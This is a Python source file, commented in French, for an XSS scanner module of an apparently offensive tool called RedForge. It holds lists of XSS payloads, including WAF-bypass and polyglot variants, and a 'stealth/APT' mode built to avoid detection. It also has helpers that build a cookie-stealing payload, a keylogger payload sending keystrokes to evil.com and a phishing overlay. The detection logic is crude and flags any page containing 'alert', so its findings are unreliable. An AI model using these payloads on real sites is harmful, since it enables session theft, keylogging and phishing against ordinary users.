#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de détection XSS pour RedForge
Détecte les vulnérabilités de Cross-Site Scripting
Version avec support furtif, APT et détection avancée
"""

import re
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from html import unescape
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.core.stealth_engine import StealthEngine


class XSSScanner:
    """Scanner avancé de vulnérabilités XSS avec support furtif"""
    
    def __init__(self):
        # Payloads XSS par catégorie
        self.xss_payloads = {
            "Basic": [
                "<script>alert('XSS')</script>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<iframe src='javascript:alert(\"XSS\")'>",
                "<a href='javascript:alert(\"XSS\")'>click</a>"
            ],
            "Event Handlers": [
                "<div onmouseover=alert('XSS')>test</div>",
                "<iframe onload=alert('XSS')>",
                "<video onloadstart=alert('XSS')>",
                "<audio onloadstart=alert('XSS')>",
                "<form onsubmit=alert('XSS')>",
                "<button onclick=alert('XSS')>",
                "<a href='javascript:alert(\"XSS\")'>click</a>",
                "<div onmouseenter=alert('XSS')>",
                "<div onclick=alert('XSS')>"
            ],
            "Encoded": [
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "%3Csvg%2Fonload%3Dalert(1)%3E"
            ],
            "DOM Based": [
                "#'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "></script><script>alert('XSS')</script>",
                "><img src=x onerror=alert('XSS')>",
                "`-alert(1)-`",
                "${alert(1)}",
                "{{7*7}}"
            ],
            "Polyglot": [
                "javascript:/*--></script></style></textarea><svg/onload=alert('XSS')>",
                "\"><svg/onload=prompt(1);>",
                "'\"><img/src='x'onerror=alert('XSS')>",
                "<SCRIPT>alert(/XSS/)</SCRIPT>",
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3E"
            ],
            "Blind XSS": [
                "<script>document.location='http://{collaborator}/c='+document.cookie</script>",
                "<img src=x onerror=document.location='http://{collaborator}/c='+document.cookie>",
                "<svg/onload=fetch('http://{collaborator}/c='+document.cookie)>",
                "<script>new Image().src='http://{collaborator}/c='+document.cookie</script>"
            ],
            "WAF Bypass": [
                "<svg/onload=alert`XSS`>",
                "<img/src=x/onerror=alert`XSS`>",
                "<body/onload=alert`XSS`>",
                "<script>alert`XSS`</script>",
                "<ScRiPt>alert`XSS`</ScRiPt>",
                "<svg><script>alert&#40;1&#41;</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
            ]
        }
        
        # Signatures de détection
        self.success_indicators = [
            'alert', 'prompt', 'confirm', 'XSS', 'javascript:',
            'onerror=', 'onload=', 'onclick=', 'onmouseover=',
            'alert(', 'prompt(', 'confirm('
        ]
        
        # Moteur de furtivité
        self.stealth_engine = StealthEngine()
        self.stealth_mode = False
        self.apt_mode = False
    
    def set_stealth_config(self, config: Dict[str, Any]):
        """
        Configure le mode furtif
        
        Args:
            config: Configuration de furtivité
        """
        self.stealth_mode = config.get('enabled', False)
        self.apt_mode = config.get('apt_mode', False)
        
        if self.stealth_mode:
            self.stealth_engine.set_delays(
                min_delay=config.get('delay_min', 1),
                max_delay=config.get('delay_max', 5),
                jitter=config.get('jitter', 0.3)
            )
            if self.apt_mode:
                self.stealth_engine.enable_apt_mode()
    
    def _apply_stealth_delay(self):
        """Applique un délai furtif"""
        if self.stealth_mode:
            self.stealth_engine.apply_delay()
    
    def _get_headers(self) -> Dict[str, str]:
        """Génère des headers furtifs"""
        if self.stealth_mode:
            return self.stealth_engine.get_headers()
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités XSS
        
        Args:
            target: URL cible
            **kwargs:
                - params: Paramètres spécifiques à tester
                - post_data: Données POST
                - collaborator: Domaine pour blind XSS
                - level: Niveau d'agressivité (1-3)
        """
        print(f"  → Scan des XSS")
        if self.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        vulnerabilities = []
        tested_params = set()
        
        # Identifier les paramètres à tester
        params_to_test = self._get_params_to_test(target, kwargs)
        level = kwargs.get('level', 3 if not self.apt_mode else 2)
        collaborator = kwargs.get('collaborator')
        
        # Sélectionner les payloads selon le niveau
        payloads = self._select_payloads(level, collaborator is not None)
        
        # Limiter les payloads en mode APT
        if self.apt_mode:
            for cat in payloads:
                payloads[cat] = payloads[cat][:15]
        
        for param in params_to_test:
            if param in tested_params:
                continue
            tested_params.add(param)
            
            for category, payload_list in payloads.items():
                for payload in payload_list:
                    self._apply_stealth_delay()
                    
                    # Remplacer collaborator si présent
                    test_payload = payload
                    if collaborator and '{collaborator}' in payload:
                        test_payload = payload.replace('{collaborator}', collaborator)
                    
                    result = self._test_xss(target, param, test_payload, 
                                           kwargs.get('post_data'))
                    
                    if result['vulnerable']:
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": test_payload[:80] + "..." if len(test_payload) > 80 else test_payload,
                            "category": category,
                            "type": result['type'],
                            "severity": "HIGH" if category != "Blind XSS" else "MEDIUM",
                            "evidence": result['evidence'],
                            "reflected": result.get('reflected', False),
                            "risk_score": 90 if category == "WAF Bypass" else 85,
                            "context": result.get('context', 'unknown')
                        })
                        print(f"      ✓ XSS trouvée: {param} -> {test_payload[:40]}...")
                        break
                else:
                    continue
                break
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "reflected_count": len([v for v in vulnerabilities if v.get('reflected')]),
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        # Limiter en mode APT
        if self.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return ['q', 'search', 's', 'query', 'id', 'page', 'name', 'value', 
                'user', 'username', 'email', 'comment', 'message', 'content']
    
    def _select_payloads(self, level: int, blind: bool) -> Dict[str, List[str]]:
        """Sélectionne les payloads selon le niveau"""
        payloads = {
            "Basic": self.xss_payloads["Basic"][:level * 3],
            "Event Handlers": self.xss_payloads["Event Handlers"][:level * 2],
            "DOM Based": self.xss_payloads["DOM Based"][:level * 2]
        }
        
        if level >= 2:
            payloads["Encoded"] = self.xss_payloads["Encoded"][:level * 2]
        
        if level >= 3:
            payloads["Polyglot"] = self.xss_payloads["Polyglot"][:level]
            payloads["WAF Bypass"] = self.xss_payloads["WAF Bypass"][:level]
        
        if blind:
            payloads["Blind XSS"] = self.xss_payloads["Blind XSS"]
        
        return payloads
    
    def _test_xss(self, target: str, param: str, payload: str, 
                  post_data: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload XSS"""
        result = {
            'vulnerable': False,
            'type': 'unknown',
            'evidence': '',
            'reflected': False,
            'context': 'unknown'
        }
        
        # Construire l'URL avec payload (GET)
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_headers()
            
            if post_data:
                # Requête POST
                post_params = parse_qs(post_data) if isinstance(post_data, str) else post_data
                if isinstance(post_params, dict):
                    if param in post_params:
                        post_params[param] = [payload]
                    else:
                        post_params[param] = [payload]
                
                response = requests.post(target, data=post_params, headers=headers,
                                       timeout=10, verify=False)
            else:
                # Requête GET
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Vérifier si le payload est réfléchi
            unescaped_text = unescape(response.text)
            
            # Nettoyer le payload pour la comparaison
            clean_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            
            if payload in response.text or clean_payload in response.text:
                result['reflected'] = True
                result['evidence'] = 'payload_reflected'
                
                # Déterminer le contexte
                result['context'] = self._determine_context(response.text, payload)
                
                # Vérifier l'exécution potentielle
                for indicator in self.success_indicators:
                    if indicator.lower() in response.text.lower():
                        result['vulnerable'] = True
                        result['type'] = 'reflected'
                        break
            
            # Vérifier les indicateurs d'exécution
            js_indicators = ['alert(', 'prompt(', 'confirm(', 'javascript:']
            for indicator in js_indicators:
                if indicator in response.text.lower():
                    result['vulnerable'] = True
                    result['type'] = 'reflected'
                    result['evidence'] = indicator
                    break
            
            # Vérifier les erreurs de parsing HTML
            if 'unterminated string literal' in response.text.lower():
                result['vulnerable'] = True
                result['type'] = 'dom_based'
                result['evidence'] = 'parsing_error'
                
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass
        
        return result
    
    def _determine_context(self, html: str, payload: str) -> str:
        """Détermine le contexte d'injection XSS"""
        contexts = {
            "html": r'<[^>]*%s[^>]*>' % re.escape(payload[:20]),
            "attribute": r'=\s*["\'][^"\']*%s[^"\']*["\']' % re.escape(payload[:20]),
            "javascript": r'(?:var|let|const)\s+\w+\s*=\s*["\'][^"\']*%s[^"\']*["\']' % re.escape(payload[:20]),
            "url": r'(?:href|src|action)\s*=\s*["\'][^"\']*%s[^"\']*["\']' % re.escape(payload[:20]),
            "script_block": r'<script[^>]*>.*?%s.*?</script>' % re.escape(payload[:20])
        }
        
        for context, pattern in contexts.items():
            if re.search(pattern, html, re.IGNORECASE | re.DOTALL):
                return context
        
        return "unknown"
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune XSS détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "reflected": len([v for v in vulnerabilities if v['type'] == 'reflected']),
                "dom_based": len([v for v in vulnerabilities if v['type'] == 'dom_based']),
                "blind": len([v for v in vulnerabilities if v['category'] == 'Blind XSS'])
            },
            "by_context": {
                "html": len([v for v in vulnerabilities if v.get('context') == 'html']),
                "attribute": len([v for v in vulnerabilities if v.get('context') == 'attribute']),
                "javascript": len([v for v in vulnerabilities if v.get('context') == 'javascript']),
                "url": len([v for v in vulnerabilities if v.get('context') == 'url'])
            },
            "by_severity": {
                "HIGH": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
                "MEDIUM": len([v for v in vulnerabilities if v['severity'] == 'MEDIUM'])
            },
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def get_steal_cookie_payload(self, collaborator: str) -> str:
        """Génère un payload pour voler les cookies"""
        return f"<script>fetch('http://{collaborator}/steal?c='+document.cookie)</script>"
    
    def get_keylogger_payload(self) -> str:
        """Génère un payload keylogger"""
        return """
        <script>
        var keys = '';
        document.onkeypress = function(e) {
            keys += e.key;
            if(keys.length >= 10) {
                fetch('http://evil.com/log?k=' + keys);
                keys = '';
            }
        }
        </script>
        """
    
    def get_phishing_payload(self, phishing_url: str) -> str:
        """Génère un payload de phishing"""
        return f"""
        <script>
        setTimeout(function() {{
            document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><iframe src="{phishing_url}" width="100%" height="100%"></iframe></div>';
        }}, 1000);
        </script>
        """
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques du scanner"""
        return {
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "payloads_count": sum(len(p) for p in self.xss_payloads.values())
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    print("=" * 60)
    print("Test de XSSScanner")
    print("=" * 60)
    
    scanner = XSSScanner()
    
    # Configuration mode APT
    scanner.set_stealth_config({
        'enabled': True,
        'apt_mode': True,
        'delay_min': 2,
        'delay_max': 5
    })
    
    # Test (simulé)
    # results = scanner.scan("https://example.com/search?q=test")
    # print(f"XSS trouvées: {results['count']}")
    
    print("\n✅ Module XSSScanner chargé avec succès")